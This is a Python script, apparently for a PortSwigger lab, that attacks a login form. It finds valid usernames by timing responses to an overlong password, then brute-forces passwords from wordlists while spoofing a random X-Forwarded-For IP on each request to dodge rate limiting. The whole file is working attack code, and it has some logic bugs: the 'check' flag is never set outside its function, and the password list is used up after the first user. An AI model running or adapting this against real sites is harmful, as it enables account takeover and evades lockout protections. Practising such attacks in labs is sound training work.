import requests
import argparse
import random

parser = argparse.ArgumentParser()
parser.add_argument("-u", help="URL", dest="URL")
# parser.add_argument("-e", help="Error", dest="Error")
args = parser.parse_args()
url = args.URL
headers = {"X-Forwarded-For": ''}
check = False

def generate_IP():
	first = random.randint(10,255)
	second = random.randint(1,255)
	third = random.randint(1,255)
	fourth = random.randint(1,255)
	IP = f"{first}.{second}.{third}.{fourth}"
	return IP

usernames = open("/home/kali/PortSwigger/wordlists/test_user")
passwords = open("/home/kali/PortSwigger/wordlists/test_pass")

def pass_loop():
	for password in passwords:
			password = password.strip()
			headers['X-Forwarded-For'] = generate_IP()
			password = password.strip()
			payload['password'] = password
			r = requests.post(url, data=payload, headers=headers)
			if "You have made too many incorrect login attempts. Please try again in 30 minute(s)." in r.text:
				print("Error too many attempts, fix proxy!")
			if "Your username is:" in r.text:
				check = True
				print(f"\nPASSWORD FOUND FOR {name}: {password}\n")
				break


def time_loop():
	for name in usernames:
		check = False
		headers['X-Forwarded-For'] = generate_IP()
		name = name.strip()
		payload['username'] = name
		r = requests.post(url, data=payload, headers=headers)
		if "You have made too many incorrect login attempts. Please try again in 30 minute(s)." in r.text:
			print("Error too many attempts, fix proxy!")
		time = r.elapsed.total_seconds()
		time *=10
		if time >=7:
			print(f"Potential User: {name} : {time}")
			pass_loop()
			if check == False:
				print(f"Password not found for {name}")

payload = {'username': "", 'password': "Thisisthelongestpasswordicanthinkofblaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaahhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhasdfasd5f45a4sdf5asdf46ae4df964a98e4dfca4e98sfd4a84es9df64c6a4e6rd4f984a6e4df9844ef9zd494af684c94af111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"}
time_loop()